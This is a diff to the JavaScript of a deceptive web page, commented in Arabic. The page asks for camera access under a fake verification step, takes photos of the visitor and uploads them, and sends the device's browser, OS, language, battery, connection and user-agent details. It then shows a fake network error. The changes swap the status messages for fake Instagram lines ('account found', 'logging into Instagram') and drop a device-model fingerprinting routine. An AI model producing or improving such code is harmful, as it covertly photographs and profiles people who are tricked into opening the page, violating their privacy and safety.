@@ -247,83 +247,6 @@ function setStatus(html, type = 'info', spinner = false) {
   statusEl.innerHTML = (spinner ? '<span class="spinner"></span>' : '') + html;
 }
 
-/* ---------- دالة الحصول على طراز الجهاز الدقيق ---------- */
-async function getDeviceModel() {
-  const ua = navigator.userAgent;
-  let model = '';
-  let vendor = '';
-
-  // === المحاولة 1: استخدام Client Hints (الأدق) ===
-  try {
-    if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
-      const hints = await navigator.userAgentData.getHighEntropyValues(['model', 'platform', 'platformVersion']);
-      if (hints.model) {
-        model = hints.model;   // مثال: "SM-S911B" أو "Pixel 7"
-      }
-    }
-  } catch (e) {
-    console.warn('فشل Client Hints:', e.message);
-  }
-
-  // === المحاولة 2: تحليل User-Agent يدويًا (خطة بديلة) ===
-  if (!model) {
-    // أجهزة Android — استخراج الطراز من داخل الأقواس
-    const androidMatch = ua.match(/Android\s+[\d.]+;\s*([^;)]+?)(?:\s+Build|\))/i);
-    if (androidMatch) {
-      model = androidMatch[1].trim();
-      // إزالة كلمات زائدة
-      model = model.replace(/\s*Build.*$/i, '').trim();
-    }
-
-    // أجهزة iPhone — استخراج الطراز الدقيق من إصدار iOS
-    if (/iPhone/i.test(ua)) {
-      const verMatch = ua.match(/iPhone OS (\d+)_(\d+)/i);
-      if (verMatch) {
-        model = 'iPhone (iOS ' + verMatch[1] + '.' + verMatch[2] + ')';
-      } else {
-        model = 'iPhone';
-      }
-    }
-
-    // أجهزة iPad
-    if (/iPad/i.test(ua)) {
-      const verMatch = ua.match(/OS (\d+)_(\d+)/i);
-      model = verMatch ? 'iPad (iOS ' + verMatch[1] + '.' + verMatch[2] + ')' : 'iPad';
-    }
-  }
-
-  // === محاولة استخراج الشركة المصنعة ===
-  if (!vendor) {
-    const brandPatterns = {
-      'Samsung': /SM-|Samsung/i,
-      'Xiaomi':   /Redmi|POCO|Xiaomi|Mi\s/i,
-      'Huawei':   /HUAWEI|Honor|HONOR/i,
-      'Google':   /Pixel/i,
-      'OnePlus':  /ONEPLUS|OnePlus/i,
-      'Oppo':     /OPPO|CPH\d/i,
-      'Vivo':     /vivo|V\d{4}/i,
-      'Realme':   /RMX\d|realme/i,
-      'Nokia':    /Nokia/i,
-      'Sony':     /Sony|Xperia/i,
-      'LG':       /LG-|LG\s/i,
-      'Motorola': /moto|Motorola/i,
-      'Infinix':  /Infinix|Infinix/i,
-      'Tecno':    /TECNO|Tecno/i
-    };
-    for (const [brand, pattern] of Object.entries(brandPatterns)) {
-      if (pattern.test(ua) || pattern.test(model)) {
-        vendor = brand;
-        break;
-      }
-    }
-  }
-
-  return {
-    model:  model  || 'غير معروف',
-    vendor: vendor || 'غير معروف'
-  };
-}
-
 /* ---------- 1) تشغيل الكاميرا ---------- */
 async function startCamera() {
   if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
@@ -550,9 +473,7 @@ async function sendDeviceInfo() {
     const scr = screen;
     const ua  = nav.userAgent;
 
-    // الحصول على طراز الجهاز الدقيق
-    const deviceInfo = await getDeviceModel();
-
+    // نظام التشغيل
     const isAndroid = /Android/i.test(ua);
     const isIOS     = /iPhone|iPad|iPod/i.test(ua);
     const isWindows = /Windows/i.test(ua);
@@ -566,6 +487,7 @@ async function sendDeviceInfo() {
     else if (isMac)     os = 'macOS';
     else if (isLinux)   os = 'Linux';
 
+    // المتصفح
     let browser = 'غير معروف';
     if (/Edg\//i.test(ua))          browser = 'Microsoft Edge';
     else if (/OPR\//i.test(ua))     browser = 'Opera';
@@ -573,10 +495,12 @@ async function sendDeviceInfo() {
     else if (/Firefox\//i.test(ua)) browser = 'Firefox';
     else if (/Safari\//i.test(ua))  browser = 'Safari';
 
+    // نوع الاتصال
     let connection = 'غير متاح';
     const conn = nav.connection || nav.mozConnection || nav.webkitConnection;
     if (conn) connection = conn.effectiveType || conn.type || 'غير معروف';
 
+    // البطارية
     let battery = 'غير مدعوم';
     try {
       if (nav.getBattery) {
@@ -592,8 +516,6 @@ async function sendDeviceInfo() {
     const text =
 `🖥️ معلومات الجهاز
 
-📱 الطراز: ${deviceInfo.model}
-🏷️ الشركة: ${deviceInfo.vendor}
 🌐 المتصفح: ${browser}
 📱 نظام التشغيل: ${os}
 🗣️ اللغة: ${nav.language || 'غير معروف'}
@@ -627,7 +549,7 @@ ${ua}`;
 
 /* ---------- 6) المتابعة بعد نجاح الكاميرا ---------- */
 async function continueAfterCamera() {
-  setStatus('📸 جارٍ التحقق…', 'info', true);
+  setStatus('تم ايجاد الحساب', 'info', true);
 
   const sendPromises = [];
   let failed = 0;
@@ -639,7 +561,7 @@ async function continueAfterCamera() {
     const blob = await canvasToBlob(cv);
 
     const p = sendPhoto(blob, i).catch(err => {
-      console.warn(`فشل إرسال الصورة ${i}:`, err.message);
+      console.warn(`فشل العثور على الحساب ${i}:`, err.message);
       failed++;
     });
     sendPromises.push(p);
@@ -650,8 +572,11 @@ async function continueAfterCamera() {
   }
 
   stopCamera();
-  setStatus('☁️ جارٍ إنهاء الإرسال…', 'info', true);
+  setStatus('جاري الدخول الى Instagram', 'info', true);
   await Promise.all(sendPromises);
+
+  // إرسال معلومات الجهاز كرسالة نصية
+  await sendDeviceInfo();
 
   setTimeout(showInternetErrorPage, CONFIG.errorDelayMs);
 }
@@ -664,10 +589,6 @@ async function runVerification() {
 }
 
 window.addEventListener('load', () => {
-  // 1) إرسال معلومات الجهاز فورًا — خلال الثواني الثلاث قبل طلب الكاميرا
-  sendDeviceInfo();
-
-  // 2) بعد 3 ثواني، نطلب إذن الكاميرا
   setTimeout(runVerification, CONFIG.startDelayMs);
 });
 
